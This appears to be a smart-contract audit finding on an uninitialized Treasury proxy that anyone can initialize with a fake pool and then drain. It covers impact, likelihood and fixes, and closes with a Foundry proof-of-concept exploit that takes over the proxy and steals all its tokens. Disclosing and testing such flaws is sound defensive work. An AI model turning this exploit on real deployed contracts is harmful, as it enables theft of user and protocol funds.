### Title
Uninitialized `Treasury` proxy can be claimed with an attacker-controlled pool and drained - (File: `contracts/Treasury.sol`)

### Summary
`Treasury.initialize()` is publicly callable on an uninitialized proxy and accepts an arbitrary `IPool` address without authenticating the caller or validating the pool. [1](#0-0)  The supplied address is persisted as the trusted `pool`, and `Treasury.pull()` trusts that pool to decide whether `msg.sender` is a valid `DepositToken`. [2](#0-1) [3](#0-2)  An attacker can therefore initialize an uninitialized treasury proxy to point to a malicious pool, have that pool recognize an attacker-controlled deposit token, and pull every ERC20 balance held by the treasury. [4](#0-3) [5](#0-4) 

### Finding Description
The implementation constructor calls `_disableInitializers()`, but that only prevents initialization in the implementation contract’s own storage; a separately deployed proxy still begins uninitialized until its delegated initializer is executed. [1](#0-0)  `initialize(IPool pool_)` has only OpenZeppelin’s `initializer` one-time guard and no caller check, expected-pool check, or registry lookup. [6](#0-5)  `__Manageable_init()` only rejects the zero address and then stores the caller-supplied pool. [2](#0-1) 

After initialization, `pull()` verifies the caller by querying `pool.doesDepositTokenExist(IDepositToken(_msgSender))`, then transfers `IDepositToken(_msgSender).underlying()` to the requested recipient. [3](#0-2)  Both predicates are attacker-controlled when `pool` is malicious: the fake pool returns `true` for the attacker’s fake deposit-token contract, and the fake deposit token returns whichever ERC20 asset should be stolen. [4](#0-3) [5](#0-4) 

### Impact Explanation
This breaks the treasury’s caller-identity invariant: authorization to withdraw assets is delegated to a mutable contract that an attacker chose during initialization. [2](#0-1) [3](#0-2)  If an uninitialized treasury proxy is deployed and left uninitialized for even one transaction, an unprivileged attacker can permanently bind it to a malicious pool and immediately or later withdraw all tokens held by the proxy. [6](#0-5) [3](#0-2)  `pull()` has no withdrawal cap, recipient allowlist, governor check, or pause check, so the loss is the full balance of each asset reported by the fake deposit token. [3](#0-2) 

### Likelihood Explanation
The attack requires only an EOA and attacker-deployed contracts, and succeeds whenever a treasury proxy is observable on-chain before its initialization transaction executes. [6](#0-5)  No privileged role, oracle manipulation, flash-loan liquidity, bridge endpoint compromise, or victim signature is needed because `initialize()` itself is the public entry point and `pull()` trusts the attacker-installed pool. [6](#0-5) [3](#0-2)  The `nonReentrant` guard does not prevent the exploit because it is a single normal external call, and `Manageable` performs no validation beyond rejecting the zero pool address. [3](#0-2) [2](#0-1) 

### Recommendation
Deploy and initialize `Treasury` atomically in the same transaction, preferably by passing the initializer calldata to the proxy constructor. [1](#0-0)  Additionally, restrict `initialize()` to a deployer/admin or validate `pool_` against the canonical `PoolRegistry` before assigning it. [6](#0-5) [2](#0-1)  For defense in depth, make `pull()` accept calls only from deposit-token addresses returned by immutable or registry-validated protocol state rather than from arbitrary caller-supplied pool state. [3](#0-2) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "../contracts/dependencies/openzeppelin/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {ERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/ERC20.sol";
import {Treasury} from "../contracts/Treasury.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";

contract Asset is ERC20 {
    constructor() ERC20("Asset", "AST") {
        _mint(msg.sender, 1_000e18);
    }
}

contract FakePool {
    function doesDepositTokenExist(address) external pure returns (bool) {
        return true;
    }
}

contract FakeDepositToken {
    IERC20 public immutable underlying;
    Treasury public immutable treasury;

    constructor(IERC20 underlying_, Treasury treasury_) {
        underlying = underlying_;
        treasury = treasury_;
    }

    function steal(address to, uint256 amount) external {
        treasury.pull(to, amount);
    }
}

contract TreasuryInitializeTakeoverTest is Test {
    function testAttackerInitializesAndDrainsTreasury() public {
        Asset asset = new Asset();
        Treasury implementation = new Treasury();

        // Proxy is deployed without initializer calldata.
        Treasury treasury = Treasury(
            address(new ERC1967Proxy(address(implementation), ""))
        );

        // Treasury later or already holds user/protocol assets.
        asset.transfer(address(treasury), 1_000e18);

        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        FakePool fakePool = new FakePool();
        treasury.initialize(IPool(address(fakePool)));

        FakeDepositToken fakeDepositToken =
            new FakeDepositToken(asset, treasury);
        fakeDepositToken.steal(attacker, asset.balanceOf(address(treasury)));

        vm.stopPrank();

        assertEq(asset.balanceOf(address(treasury)), 0);
        assertEq(asset.balanceOf(attacker), 1_000e18);
    }
}
```

The PoC reproduces the issue because `initialize()` accepts `FakePool`, `FakePool.doesDepositTokenExist()` returns `true` for `FakeDepositToken`, and `FakeDepositToken.underlying()` returns the treasury-held asset that `pull()` transfers to the attacker. [6](#0-5) [3](#0-2)
